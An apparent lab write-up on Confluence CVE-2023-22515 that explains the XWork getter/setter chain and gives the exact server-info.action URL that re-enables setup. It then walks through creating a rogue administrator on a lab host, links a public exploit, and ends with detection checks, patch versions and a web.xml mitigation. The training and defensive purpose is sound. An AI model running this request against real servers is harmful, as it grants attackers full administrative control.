---
sticker: emoji//1f499
---

# Confluence CVE-2023-22515

On October 4th, 2023, Atlassian released a [security advisory](https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html) regarding **CVE-2023-22515**, a broken access control vulnerability, with an assigned CVSS score of **10.0**. The vulnerability was introduced in version 8.0.0 of Confluence Server and Data Center editions and is present in versions `<8.3.3`, `<8.4.3`, `<8.5.2`. According to Atlassian, the vulnerability has already been exploited in the wild.

An attacker can exploit the vulnerability to create an additional account in Confluence with full administrative privileges. The attacker needs no prior information to exploit the vulnerability. The vulnerability is believed to enable other unknown attack vectors and should be patched as soon as possible.

## Confluence's Initial Setup

When running Confluence for the first time, you'll go through the initial setup, which allows you to configure some basic parameters and create an administrative account. The initial setup can be reached by navigating to `http://10.10.140.118:8090/setup/`.

If you try to access the initial setup after you have completed it, you won't be able to go through the setup again but will be greeted with a message stating that the setup process is already complete:

![Setup Complete Message](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/87a38e7e852b41d0cf2eee22d9a1708e.png)

This is normal expected behavior and would normally not be useful for an attacker at all.

## Enter CVE-2023-22515

This vulnerability allows an attacker to reenable the initial setup process. In doing so, the attacker can go through the step of creating a new administrator all over again.

This is all possible because Confluence is built using the Apache Struts framework, which depends on the XWork package. XWork allows you to define Actions in the form of a Java class. Each Action can be invoked through a URL, and the corresponding Java class will handle the request, do whatever the Action requires, and emit a response.&#x20;

To clarify how Actions work, navigate to `http://10.10.140.118:8090/`. You should immediately be redirected to `http://10.10.140.118:8090/login.action`. This URL calls an Action bound to a Java class to handle login attempts. When an Action is invoked through its URL, the `execute()` method of the class will be called by default.

## Calling Getters/Setters via XWorks&#x20;

We can also call getters and setters in Action classes by using a URL specifying an HTTP parameter with the chain of attributes we want to get/set. As an example, if the login Action class had a `setId()` method, we could invoke it via the following URL:

```shell
http://10.10.140.118:8090/login.action?Id=123
```

This would execute `setId('123')` as defined in the corresponding Action class.

## Chaining Getters/Setters to Reenable the Initial Setup

The reported exploit takes advantage of the `ServerInfoAction` Action. The reason for picking this specific Action is that we can build a chain of getters/setters from it to set the configuration parameter that turns the initial setup on or off.

If you analyse the code of the `ServerInfoAction` class, you'll see it extends the `ConfluenceActionSupport` class. By doing so, it will inherit all of its methods as well. One such method is a getter that returns a `BootstrapStatusProvider` object:

```java
public class ConfluenceActionSupport extends ActionSupport implements LocaleProvider, WebInterface, MessageHolderAware {
  public BootstrapStatusProvider getBootstrapStatusProvider() {
    if (this.bootstrapStatusProvider == null)
      this.bootstrapStatusProvider = BootstrapStatusProviderImpl.getInstance(); 
    return this.bootstrapStatusProvider;
  }
}
```

We care about the `BootstrapStatusProvider` class because it has another getter method we can use to retrieve an `ApplicationConfiguration` object:

```java
public class BootstrapStatusProviderImpl implements BootstrapStatusProvider, BootstrapManagerInternal {
  public ApplicationConfiguration getApplicationConfig() {
    return this.delegate.getApplicationConfig();
  }
}
```

As you have probably guessed by now, this object contains the application's configuration, including an attribute that tells Confluence if the initial setup has been finished. Such attribute can be modified by using a setter in the `ApplicationConfig` class:

```java
public class ApplicationConfig implements ApplicationConfiguration {
  public synchronized void setSetupComplete(boolean setupComplete) {
    this.setupComplete = setupComplete;
  }  
}
```

If we call `setSetupComplete(false)`, we will effectively reenable the initial setup. Putting it all together, we can call that chain of getters/setters by accessing the following URL:

```shell-session
http://10.10.140.118:8090/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
```

This will be effectively translated by XWork into a call to:

```java
getBootstrapStatusProvider().getApplicationConfig().setSetupComplete(false)
```

Now, go to your browser and navigate to the crafted URL to trigger the vulnerability. You should get the following response from the server:

![Successful Exploit Response](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f84573513308dce89e4e11f2aa5421d7.png)

## Creating an Admin Account

Now that we can access the initial setup once again, let's browse to:&#x20;

```shell-session
http://10.10.140.118:8090/setup/setupadministrator-start.action
```

Fill in the details of your new admin user and click next:

![Creating a New Admin](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eabc9bac04b7cf6512f120e4e93e0df6.png)

If all goes well, you should get access to Confluence with administrative privileges!

![Checking the Admin Account](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5a03b959aba38ec9fb2e12cd37401176.png)

In this task, we have gone through a quick explanation of the vulnerability. If you want a more in-depth look at the technical details, check [Rapid7 analysis in attackerKB](https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis?referrer=moreFromAKB).

## AUTOMATING EXPLOITATION

As we have seen, exploiting the vulnerability is relatively straightforward and can be done manually using a single request and a regular browser. Even so, automated exploits are readily available.&#x20;

Chocapikk developed one such exploit, which can be downloaded from [here](https://github.com/Chocapikk/CVE-2023-22515). Feel free to download and use the exploit against the target machine!

On the other hand, if you need to test many servers to see if they are vulnerable, a simple vulnerability scanner was developed by ErikWynter. It can be obtained from his [GitHub page](https://github.com/ErikWynter/CVE-2023-22515-Scan). Unlike Chocapikk's script, this one will not exploit the vulnerability but test for it only.

## Detection

Should you have an instance of a vulnerable version of Confluence, be sure to check for the following:

* Network access logs pointing to `/setup/*.action`. There's no reason for a regular user to request such URLs after installation.
* Network access logs to `/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false`.
* Review your Confluence users and look for suspicious accounts and members of the `confluence-administrators` group.

## Patching

All vulnerable instances should be upgraded to at least one of the following versions as soon as possible:

* 8.3.3
* 8.4.3
* 8.5.2

If upgrading is not possible immediately, access to the `/setup/*` endpoints may be blocked as a temporary measure. To do so, add the following security constraint inside the `<web-app>` tag in `/<confluence-install-dir>/confluence/WEB-INF/web.xml`:

```xml
<security-constraint>
  <web-resource-collection>
    <url-pattern>/setup/*</url-pattern>
    <http-method-omission>*</http-method-omission>
  </web-resource-collection>
  <auth-constraint />
</security-constraint>
```

This will effectively restrict the access to `/setup/*`.

Remember that the mitigation instructions shouldn't be considered a definitive patch but only an interim measure. Servers should still be upgraded as soon as it becomes possible.
